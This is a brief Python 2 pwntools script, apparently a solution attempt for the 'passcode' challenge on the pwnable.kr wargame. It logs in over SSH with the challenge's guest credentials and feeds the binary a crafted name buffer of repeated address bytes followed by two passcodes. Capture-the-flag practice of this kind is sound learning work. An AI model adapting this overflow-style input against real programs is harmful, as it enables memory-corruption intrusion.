
from pwn import *


def shell(server, port_, user_, password_):
    return ssh(user_, server, password=password_, port=port_) 



def send_recv(proc, data, timeo=5):
    proc.sendline(data)
    return proc.recvline(timeout=timeo)



def run(executable):
    name = '\x1c\xcb\xff\xff' * 25
    passcode1 = '338150'
    passcode2 = '13371337'
    sh = shell('pwnable.kr', 2222, 'passcode', 'guest')
    proc = sh.run(executable)
    r = proc.recvline(timeout=2)
    print r
    r = send_recv(proc, name)
    print r
    r = send_recv(proc, passcode1)
    print r
    r = send_recv(proc, passcode2)
    print r
    r = proc.recvline(timeout=5)
    print r
    proc.shutdown()
    proc.close()
    sh.close()

if __name__ == '__main__':
    run('/home/passcode/passcode')
